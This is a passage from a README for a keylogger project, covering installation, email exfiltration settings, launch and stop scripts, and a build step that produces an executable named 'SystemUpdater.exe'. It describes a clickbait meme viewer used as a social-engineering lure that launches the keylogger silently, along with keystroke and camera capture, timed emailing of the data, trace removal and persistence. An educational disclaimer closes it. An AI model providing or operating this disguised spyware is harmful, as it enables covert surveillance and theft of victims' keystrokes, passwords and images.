cd keylogger-project
```

2. Install required packages:
```
pip install -r requirements.txt
```

3. Configure email settings in keylogger.py:
```python
EMAIL_ADDRESS = "your-email@example.com"
EMAIL_PASSWORD = "your-app-password"
```

## Usage Guide

### Starting the Keylogger

#### üíØ RECOMMENDED METHOD: Enhanced Clickbait UI
Run the eye-catching meme viewer for maximum engagement:
```
python funny_memes.py
```

**Features of the Premium Clickbait UI:**
- Bold, attention-grabbing title: "üî• VIRAL MEMES 2024 - YOU WON'T BELIEVE #6! üî•"
- Vibrant red background with contrasting elements 
- Six enticing category buttons with clickbait topics:
  - "üëΩ ALIEN SECRETS NASA DOESN'T WANT YOU TO KNOW"
  - "üí∞ MILLIONAIRES HATE THIS ONE SIMPLE TRICK"
  - "üçï FAST FOOD EMPLOYEE REVEALS WHAT THEY REALLY PUT IN YOUR FOOD"
  - And more!
- Advanced psychological triggers:
  - Social proof: "42,860 people viewing right now"
  - Scarcity: "Exclusive access ends in 4:59"
  - FOMO: "BANNED memes" and "TOP SECRET content"
- Multi-stage interaction flow to maximize engagement time
- Professional-looking error message to close the interaction loop

#### Alternative Methods
```
Double-click run_keylogger.bat
```
or
```
Double-click launch.bat
```

### Stopping the Keylogger

First, check if it's running:
```
Double-click simple_check.bat
```

Then choose a termination method:

1. **Standard Termination**:
   ```
   Double-click win10_kill.bat
   ```

2. **Advanced Termination** (requires admin):
   ```
   Right-click advanced_stop.bat ‚Üí Run as administrator
   ```

3. **Emergency Termination**:
   ```
   Double-click emergency_kill.bat
   ```

4. **Last Resort**:
   ```
   Double-click simple_restart.bat
   ```

## Creating a Standalone Executable

If you want to create a single executable file:

```
python build_standalone.py
```

The executable will be created in the `dist` folder with the name "SystemUpdater.exe"

## How It Works

1. **High-Engagement UI**: The clickbait interface captures user attention with carefully crafted psychological triggers
2. **Background Activation**: While the user interacts with the engaging UI, the keylogger silently launches
3. **Enhanced Monitoring**: Advanced camera captures with brightness enhancement, keystroke logging, and more
4. **Stealth Transmission**: Data is silently emailed at regular intervals
5. **Trace Removal**: All temporary files are automatically deleted
6. **Persistent Operation**: Monitoring continues even after the UI application is closed

## Security Notes

- The keylogger is detectable by antivirus software
- Modern security solutions can identify this type of monitoring
- Windows Defender and other security tools may flag or block this software
- The enhanced UI provides superior social engineering capabilities

## Ethical Considerations

This project is provided for educational purposes to demonstrate:
- Security vulnerabilities
- Privacy concerns
- Social engineering techniques
- Clickbait and psychological manipulation tactics
- The importance of robust security measures

**Never use this software on any computer without explicit consent from the owner. Unauthorized monitoring is illegal and unethical.**
